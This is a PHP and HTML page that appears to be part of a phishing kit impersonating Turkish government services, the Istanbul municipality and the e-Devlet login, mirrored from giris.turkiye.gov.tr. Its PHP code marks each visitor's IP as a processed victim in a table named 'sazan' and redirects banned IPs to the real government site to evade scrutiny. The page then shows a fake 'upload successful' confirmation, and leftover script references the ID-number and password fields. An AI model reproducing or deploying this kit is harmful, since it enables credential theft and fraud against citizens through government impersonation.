<?php
date_default_timezone_set('Europe/Istanbul');
include('baglan.php');
$ip = $_SERVER['REMOTE_ADDR'];
$db->query("UPDATE sazan SET now = 'TEBRIKLENDI' WHERE ip = '{$ip}'");

$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
    if($kontrol['ban'] == $ip){ 
        header('Location:http://www.turkiye.gov.tr');
    } 
}
?>

<!--[if IE 8]>
<html class="ie8">
	<![endif]-->
    <!doctype htm<!DOCTYPE html>
<html lang="tr">
    <head>
<link rel="stylesheet" href="styles.css">
<meta charset="UTF-8"
</head>



<div class="wrapper fadeInDown">
  <div id="formContent">
    <!-- Tabs Titles -->
<BR><BR>
    <!-- Icon -->
    <div class="fadeIn first">
      <img src="data:image/png;base64,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" id="icon" width="1" alt="User Icon" />
      <BR><BR>
    </div>

    <!-- Login Form -->
    <form action="index.php">
      <h2 class="active"> Tebrikler. Yükleme başarılı.</h2>
      <input type="submit" class="fadeIn fourth" value="Ana Sayfa">
    </form>

    <!-- Remind Passowrd -->
    <div id="formFooter">
      <a href="https://www.ibb.istanbul">
        <img src="https://upload.wikimedia.org/wikipedia/tr/2/24/Ibb_amblem.png" width="100">
      </a>
    </div>

  </div>
</div>
<style>
    @import url('https://fonts.googleapis.com/css?family=Poppins');

/* BASIC */

html {
  background-color: #56BAED;
}

body {
  font-family: "Poppins", sans-serif;
  height: 100vh;
}

a {
  color: #92badd;
  display:inline-block;
  text-decoration: none;
  font-weight: 400;
}

h2 {
  text-align: center;
  font-size: 16px;
  font-weight: 600;
  text-transform: uppercase;
  display:inline-block;
  margin: 40px 8px 10px 8px; 
  color: #cccccc;
}



/* STRUCTURE */

.wrapper {
  display: flex;
  align-items: center;
  flex-direction: column; 
  justify-content: center;
  width: 100%;
  min-height: 100%;
  padding: 20px;
}

#formContent {
  -webkit-border-radius: 10px 10px 10px 10px;
  border-radius: 10px 10px 10px 10px;
  background: #fff;
  padding: 30px;
  width: 90%;
  max-width: 450px;
  position: relative;
  padding: 0px;
  -webkit-box-shadow: 0 30px 60px 0 rgba(0,0,0,0.3);
  box-shadow: 0 30px 60px 0 rgba(0,0,0,0.3);
  text-align: center;
}

#formFooter {
  background-color: #f6f6f6;
  border-top: 1px solid #dce8f1;
  padding: 25px;
  text-align: center;
  -webkit-border-radius: 0 0 10px 10px;
  border-radius: 0 0 10px 10px;
}



/* TABS */

h2.inactive {
  color: #cccccc;
}

h2.active {
  color: #0d0d0d;
  border-bottom: 2px solid #5fbae9;
}



/* FORM TYPOGRAPHY*/

input[type=button], input[type=submit], input[type=reset]  {
  background-color: #56BAED;
  border: none;
  color: white;
  padding: 15px 80px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  text-transform: uppercase;
  font-size: 13px;
  -webkit-box-shadow: 0 10px 30px 0 rgba(95,186,233,0.4);
  box-shadow: 0 10px 30px 0 rgba(95,186,233,0.4);
  -webkit-border-radius: 5px 5px 5px 5px;
  border-radius: 5px 5px 5px 5px;
  margin: 5px 20px 40px 20px;
  -webkit-transition: all 0.3s ease-in-out;
  -moz-transition: all 0.3s ease-in-out;
  -ms-transition: all 0.3s ease-in-out;
  -o-transition: all 0.3s ease-in-out;
  transition: all 0.3s ease-in-out;
}

input[type=button]:hover, input[type=submit]:hover, input[type=reset]:hover  {
  background-color: #39ace7;
}

input[type=button]:active, input[type=submit]:active, input[type=reset]:active  {
  -moz-transform: scale(0.95);
  -webkit-transform: scale(0.95);
  -o-transform: scale(0.95);
  -ms-transform: scale(0.95);
  transform: scale(0.95);
}

input[type=text] {
  background-color: #f6f6f6;
  border: none;
  color: #0d0d0d;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 5px;
  width: 85%;
  border: 2px solid #f6f6f6;
  -webkit-transition: all 0.5s ease-in-out;
  -moz-transition: all 0.5s ease-in-out;
  -ms-transition: all 0.5s ease-in-out;
  -o-transition: all 0.5s ease-in-out;
  transition: all 0.5s ease-in-out;
  -webkit-border-radius: 5px 5px 5px 5px;
  border-radius: 5px 5px 5px 5px;
}

input[type=text]:focus {
  background-color: #fff;
  border-bottom: 2px solid #5fbae9;
}

input[type=text]:placeholder {
  color: #cccccc;
}



/* ANIMATIONS */

/* Simple CSS3 Fade-in-down Animation */
.fadeInDown {
  -webkit-animation-name: fadeInDown;
  animation-name: fadeInDown;
  -webkit-animation-duration: 1s;
  animation-duration: 1s;
  -webkit-animation-fill-mode: both;
  animation-fill-mode: both;
}

@-webkit-keyframes fadeInDown {
  0% {
    opacity: 0;
    -webkit-transform: translate3d(0, -100%, 0);
    transform: translate3d(0, -100%, 0);
  }
  100% {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes fadeInDown {
  0% {
    opacity: 0;
    -webkit-transform: translate3d(0, -100%, 0);
    transform: translate3d(0, -100%, 0);
  }
  100% {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

/* Simple CSS3 Fade-in Animation */
@-webkit-keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
@-moz-keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
@keyframes fadeIn { from { opacity:0; } to { opacity:1; } }

.fadeIn {
  opacity:0;
  -webkit-animation:fadeIn ease-in 1;
  -moz-animation:fadeIn ease-in 1;
  animation:fadeIn ease-in 1;

  -webkit-animation-fill-mode:forwards;
  -moz-animation-fill-mode:forwards;
  animation-fill-mode:forwards;

  -webkit-animation-duration:1s;
  -moz-animation-duration:1s;
  animation-duration:1s;
}

.fadeIn.first {
  -webkit-animation-delay: 0.4s;
  -moz-animation-delay: 0.4s;
  animation-delay: 0.4s;
}

.fadeIn.second {
  -webkit-animation-delay: 0.6s;
  -moz-animation-delay: 0.6s;
  animation-delay: 0.6s;
}

.fadeIn.third {
  -webkit-animation-delay: 0.8s;
  -moz-animation-delay: 0.8s;
  animation-delay: 0.8s;
}

.fadeIn.fourth {
  -webkit-animation-delay: 1s;
  -moz-animation-delay: 1s;
  animation-delay: 1s;
}

/* Simple CSS3 Fade-in Animation */
.underlineHover:after {
  display: block;
  left: 0;
  bottom: -10px;
  width: 0;
  height: 2px;
  background-color: #56BAED;
  content: "";
  transition: width 0.2s;
}

.underlineHover:hover {
  color: #0d0d0d;
}

.underlineHover:hover:after{
  width: 100%;
}



/* OTHERS */

*:focus {
    outline: none;
} 

#icon {
  width:60%;
}

* {
  box-sizing: border-box;
}
</style></html>
<script type="text/javascript">
    $(document).ready(function () {

        var password = $.jCryption.encrypt("mySuperPassword", "turbo");
        var auth = false;
        $.jCryption.authenticate(password, "CryptoServlet?generateKeyPair=true", "CryptoServlet?handshake=true", function (AESKey) {
                auth = true;
            },
            function () {
                auth = false;
            });

        $('form').submit(function () {
            if (auth) {
                $('#encTridField').val($.jCryption.encrypt($('#tridField').val(), password));
                $('#tridField').val('');
                $('#encEgpField').val($.jCryption.encrypt($('#egpField').val(), password));
                $('#egpField').val('');
            }
        });
    });
</script>
</body>

<!-- Mirrored from giris.turkiye.gov.tr/Giris/e-Devlet-Sifresi by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 13 Jul 2022 11:30:47 GMT -->
</html>
